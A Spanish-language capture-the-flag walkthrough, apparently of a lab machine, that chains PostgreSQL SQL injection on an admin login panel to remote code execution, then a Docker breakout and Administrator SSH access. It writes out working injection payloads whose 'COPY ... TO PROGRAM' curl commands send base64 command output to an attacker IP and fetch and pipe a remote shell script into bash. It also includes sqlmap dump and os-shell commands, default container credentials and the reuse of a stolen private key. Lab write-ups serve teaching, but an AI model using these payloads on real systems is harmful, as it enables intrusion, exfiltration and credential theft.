
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
443/tcp   open  https

-Escaneamos más profundamente el puerto 443 y encontramos un subdominio:
	-commonName=**admin.megalogistic.com**

-Añadimos el subdominio al /etc/hosts 

-Al entrar nos encontramos un Panel de Login, Probamos SQLI:
	-Username: '
	-Password: '
		-Salen los siguientes Errores:
			**Warning**: pg_query(): Query failed: ERROR: syntax error at or near ")" LINE 1: ...T * FROM users WHERE username = ''' AND password = md5('''); ^ in **/var/www/admin/index.php** on line **10**  
			**Warning**: pg_num_rows() expects parameter 1 to be resource, bool given in **/var/www/admin/index.php** on line **11**

-Buscamos los errores y vemos que nos estamos enfrentando ante una Base de Datos **PostGrestSQL**

## SQLI - DB Enumeration

### SQLMAP

-Listamos las BDS existentes:
	-sqlmap -u https://admin.megalogistic.com/ --forms --dbs --batch
		available databases [3]:
		[*] information_schema
		[*] pg_catalog
		[*] public

-Enumeramos las Tablas de la BD 'public':
	-sqlmap -u https://admin.megalogistic.com/ -D public --tables --forms --batch
		+-------+
		| users |
		+-------+

-Dumpeamos toda la info de la Tabla 'users':
	-sqlmap -u https://admin.megalogistic.com/ -D public -T users --dump --forms --batch
		+----------------------------------+----------+
		| password                         | username |
		+----------------------------------+----------+
		| 4a100a85cb5ca3616dcf137918550815 | admin    |
		+----------------------------------+----------+

-No nos sirve de nada


## SQLI to RCE

### Manual

-Nos vamos a Hacktricks, al siguiente apartado el cual explota un RCE en versiones de PostgrestSQL desde la 9.3:
	https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html

-Verificamos que es vulnerable:
	POST
	Host: admin.megalogistic.com
	username='; copy (SELECT '') to program 'curl http://10.10.14.27?f=`ls -l|base64`'-- -&password=test
		-En nuestro servidor:
			GET /?f=dG90YWwgMTEyCi1ydy0tLS0tLS0gMSBwb3N0Z3JlcyBwb3N0Z3JlcyAgICAzIEZlYiAxOCAgMjAy
		-Decodificamos la cadena en base64 y:
			-rw------- 1 postgres postgres

-Conseguir Acceso (2 ways):
	1-Utilizando el código anterior, hacemos Petición a nuestro archivo.sh:
		username='; copy (SELECT '') to program 'curl http://10.10.14.27?f=`curl http://10.10.14.27/shell.sh |bash|base64`'-- -&password=test
			postgres@bc56e3cc55e9:/$ whoami
				postgres
	2-Con los siguientes Comandos consecutivos:
		1-username=';DROP TABLE IF EXISTS cmd_exec;-- -&password=test
		2-username=';CREATE TABLE cmd_exec(cmd_output text);-- -&password=test
		3-username=';COPY cmd_exec FROM PROGRAM 'curl http://10.10.14.27/shell.sh | bash';-- -&password=test
			postgres@bc56e3cc55e9:/$ whoami
				postgres


### SQLMAP

-Probamos con el parámetro de SQLMAP **'--os-shell'**, para intentar conseguir una shell:
	-sqlmap -u https://admin.megalogistic.com/ --os-shell --forms --batch
		os-shell> id
			**uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)**
				**FUNCIONA!!!**


-NOTA: Nos damos cuenta que estamos dentro de un Contenedor de Docker:
	-cd /
	-ls -la:
		.dockerenv
	-hostname -I:
		172.17.0.2

## Escalada y Pivoting (Docker Breakout)

### Docker Breakout

-Probamos a usar el script 'hostdescovery.sh' pero no nos reporta nada

-Usamos el siguiente Comando y encontramos otra IP:
	-route -n:
		Gateway
		172.17.0.1

-Enumeramos los puertos abiertos de la nueva IP encontrada con el script 'portscan.sh':
	./portscan.sh 
		port 22 is open
		port 443 is open

-Nos acordamos del archivo 'docker-toolbox.exe' que descargamos de FTP, buscamos en google --> docker-toolbox default credentials y encontramos:
	user: **docker**
	pwd: **tcuser**

-Pivotamos a la Máquina conectándonos por SSH a la 172.17.0.1:
	-ssh docker@172.17.0.1
	-Password: tcuser
		docker@box:~$ whoami
			docker

## Escalada Final

-Ya en la Máquina 172.17.0.1, nos vamos a la siguiente ruta y descubrimos un 'id_rsa':
	-/c/Users/Administrator/.ssh/id_rsa

-En nuestra Máquina Local:
	-Le damos los permisos necesarios:
		-chmod 600 id_rsa

-Nos conectamos por SSH a la Máquina Final:
	-ssh -i id_rsa Administrator@10.10.10.236 
		**administrator@TOOLBOX C:\Users\Administrator>whoami**
			**toolbox\administrator**